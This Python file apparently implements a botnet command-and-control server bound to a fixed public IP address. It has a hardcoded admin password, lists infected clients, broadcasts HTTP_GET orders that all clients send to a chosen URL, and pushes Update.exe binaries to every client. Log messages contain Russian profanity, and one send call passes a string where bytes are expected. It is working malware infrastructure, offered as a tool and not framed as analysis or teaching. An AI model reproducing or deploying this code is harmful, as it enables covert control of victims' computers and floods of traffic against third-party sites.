import socket
import threading
import os
import time

ALOGIN_CMD = "ALOGIN : cxpzeRGSPJEd"
LIST_CMD = "LIST"
ALIST_CMD = "ALIST"
HTTP_GET_CMD = "HTTP_GET"
UPDATE_CMD = "UPDATE"
GET_UPDATER_CMD = "GET_UPDATER"
UPDATE_CONFIRM_CMD = "UPDATE_CONFIRM"

class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = []
        self.admins = []  # list to store all connected admins
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))

    def start(self):
        self.server.listen()
        print(f"Server listening on {self.host}:{self.port}")
        while True:
            client, address = self.server.accept()
            self.clients.append(client)
            print(f"New client connected from {address}")
            threading.Thread(target=self.handle_client, args=(client, )).start()

    def handle_client(self, client):
        while True:
            try:
                message = client.recv(1024).decode()
                if message:
                    if message == UPDATE_CMD:
                        try:
                            for c in self.clients:
                                if not (c in self.admins):
                                    c.sendall(f"UPDATE".encode())
                        except Exception as e:
                            print(repr(e))
                        print("UPDATE recieved")
                        print("Update Sent!")
                    elif message == UPDATE_CONFIRM_CMD:
                        file_name = "Update.exe"
                        file_data = None
                        print(f"{os.path.getsize(file_name)}")
                        time.sleep(0.1)
                        client.sendall(f"{os.path.getsize(file_name)}".encode())
                        time.sleep(0.1)
                        with open(file_name, 'rb') as file:
                            file_data = file.read()
                        client.sendall(file_data)
                    elif message == GET_UPDATER_CMD:
                        file_name = "Updater.exe"
                        file_data = None
                        print(f"{os.path.getsize(file_name)}")
                        client.sendall(f"{os.path.getsize(file_name)}".encode())
                        time.sleep(0.1)
                        with open(file_name, 'rb') as file:
                            file_data = file.read()
                        client.sendall(file_data)

                    elif message == ALOGIN_CMD:
                        self.admins.append(client)  # add admin to the admins list
                        print(f"♥ Админ {client.getsockname()} в чате нахуй ♥")
                    elif message == LIST_CMD:
                        data = f"\nOnline: {len(self.clients) - len(self.admins)}\n\n"
                        if client in self.admins:
                            for c in self.clients:
                                if not (c in self.admins):
                                    data += str(c.getpeername()) + "\n"
                            client.sendall(str(data).encode())
                    elif message == ALIST_CMD:
                        data = f"\nOnline: {len(self.admins)}\n\n"
                        if client in self.admins:
                            for c in self.admins:
                                data += str(c.getpeername()) + "\n"
                            client.sendall(str(data).encode())
                    elif HTTP_GET_CMD in message:
                        print("PIZDA?")
                        url = message.split(':')[1]
                        for c in self.clients:
                            if not (c in self.admins):
                                c.sendall(f"{HTTP_GET_CMD}:{url}")
                                try:
                                    response = c.recv(1024).decode()
                                    if(response == "SUCCESS"):
                                        client.sendall("Request sent successfully!".encode())
                                    else:
                                        client.sendall("Request failed!".encode())
                                except socket.timeout:
                                    client.sendall("Request failed!".encode())
                    else:
                        print(f"Received message: {message}")
                        # Send message to all clients if sender is an admin
                        if client in self.admins:
                            for c in self.clients:
                                if c != client:
                                    c.sendall(message.encode())
                        else:
                            client.send("Message Received Successfully!".encode())
                else:
                    self.remove(client)
                    break
            except:
                self.remove(client)
                break

    def remove(self, client):
        if client in self.clients:
            self.clients.remove(client)
            if client in self.admins:
                print(f"♥ Админ нас покинул сука(( ♥")
                self.admins.remove(client)  # remove admin from the admins list
            else:
                print(f"Client Disconnected!")
            client.close()

if __name__ == "__main__":
    server = Server("212.109.199.128", 4202)
    server.start()